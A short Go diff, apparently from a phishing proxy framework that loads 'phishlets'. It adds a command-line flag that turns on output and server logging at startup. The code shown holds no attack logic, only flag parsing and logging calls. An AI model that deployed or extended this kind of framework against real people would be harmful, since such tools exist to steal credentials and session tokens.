@@ -14,6 +14,7 @@ import (
 )
 
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
+var log_output = flag.Bool("log", false, "Enable output logging")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 
@@ -30,9 +31,13 @@ func joinPath(base_path string, rel_path string) string {
 func main() {
 	exe_path, _ := os.Executable()
 	exe_dir := filepath.Dir(exe_path)
-
 	core.Banner()
 	flag.Parse()
+	log.LogEnable(*log_output)
+	if *log_output {
+		log.StartServerLogging()
+		log.Info("Output Logging enabled")
+	}
 	if *phishlets_dir == "" {
 		*phishlets_dir = joinPath(exe_dir, "./phishlets")
 		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
